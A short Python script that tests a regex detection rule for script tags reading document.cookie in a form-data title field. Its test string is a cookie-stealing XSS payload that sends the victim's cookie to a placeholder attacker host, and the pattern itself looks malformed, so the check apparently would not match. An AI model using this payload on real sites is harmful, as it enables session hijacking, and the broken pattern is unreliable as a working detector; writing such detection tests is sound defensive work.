import re

test_string = '<script>var i=new Image;i.src="http://ATTACKERIP/?"+document.cookie;</script>'
pattern = r'"/Content-Disposition:\sform-data;\sname=\"title\"\s*<script>.*document\.cookie.*<\/script>/i"'

match = re.search(pattern, test_string, re.IGNORECASE)

result = "Matched" if match else "Not Matched"
print(result)
